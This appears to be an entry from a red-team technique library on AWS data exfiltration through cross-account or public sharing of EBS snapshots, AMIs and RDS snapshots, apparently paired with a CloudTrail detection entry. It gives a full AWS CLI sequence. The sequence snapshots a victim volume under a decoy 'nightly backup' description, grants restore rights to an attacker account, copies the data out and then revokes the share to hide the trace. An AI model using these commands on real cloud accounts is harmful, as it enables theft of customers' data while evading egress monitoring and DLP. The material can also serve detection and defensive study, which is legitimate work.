---
id: aws-snapshot-share-exfil
title: AWS cross-account snapshot / AMI share (exfil without egress)
section: AWS / cloud exfiltration
phase: Exfiltration
attack:
  tactic: TA0010
  techniques: [T1537]
platform: [cloud]
source: MITRE ATT&CK T1537; cross-account EBS/RDS snapshot and AMI sharing
pair: aws-snapshot-share-cloudtrail
---

Exfil that never crosses an egress boundary. Rather than pulling bytes out — where a
proxy, NetFlow, or an object-read burst would see them — snapshot the volume and
*hand the copy to an account you control*, then restore it there at your leisure. The
data moves entirely inside AWS's own address space, over AWS's own APIs, so egress
monitoring, DLP, and the `GetObject`-volume signal in `aws-s3-mass-exfil` all stay
quiet. The whole victim-side footprint is one control-plane grant.

RDS snapshots and AMIs take the same move, and `--group-names all` skips the account
list entirely by making the snapshot public — noisier, but it needs no second account
at all. Clean-up is symmetric: `--operation-type remove` un-shares once the copy is
taken, so anything that inventories *currently* shared snapshots finds nothing
afterwards. (Cloud — no on-host target, so no slots.)

```sh
# snapshot the victim volume, then grant restore rights to an account you control
aws ec2 create-snapshot --volume-id <vol> --description 'nightly backup'
aws ec2 modify-snapshot-attribute --snapshot-id <snap> \
  --attribute createVolumePermission --operation-type add --user-ids <attacker-acct>
# the same move on an AMI, or on an RDS snapshot
aws ec2 modify-image-attribute --image-id <ami> \
  --launch-permission 'Add=[{UserId=<attacker-acct>}]'
aws rds modify-db-snapshot-attribute --db-snapshot-identifier <snap> \
  --attribute-name restore --values-to-add <attacker-acct>
# …or skip the account list and make it public
aws ec2 modify-snapshot-attribute --snapshot-id <snap> \
  --attribute createVolumePermission --operation-type add --group-names all
# then, from the attacker account (invisible to the victim's trail), take the copy
aws ec2 copy-snapshot --source-region <region> --source-snapshot-id <snap> --region <own>
aws ec2 modify-snapshot-attribute --snapshot-id <snap> \
  --attribute createVolumePermission --operation-type remove --user-ids <attacker-acct>
```
